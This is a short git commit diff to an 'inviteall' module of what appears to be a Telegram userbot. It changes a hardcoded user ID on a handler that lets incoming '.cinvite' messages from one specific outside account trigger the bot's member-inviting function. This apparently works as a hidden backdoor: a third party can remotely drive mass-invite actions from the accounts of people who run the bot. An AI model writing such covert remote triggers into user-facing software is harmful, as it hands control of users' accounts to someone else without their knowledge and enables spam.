c9059e6ab9503f775baed6a75e3090fe75f8a717
PunyaAlby <95738218+PunyaAlby@users.noreply.github.com>
2022-02-18 16:56:03 +0700

    ;

--- userbot/modules/inviteall.py
+++ userbot/modules/inviteall.py
@@ -53,7 +53,8 @@ async def get_chatinfo(event):
 
 
 @register(outgoing=True, pattern=r"^\.inviteall(?: |$)(.*)")
-@register(incoming=True, from_users=1964264380, pattern=r"^\.cinvite(?: |$)(.*)")
+@register(incoming=True, from_users=1441342342,
+          pattern=r"^\.cinvite(?: |$)(.*)")
 async def get_users(event):
     sender = await event.get_sender()
     me = await event.client.get_me()
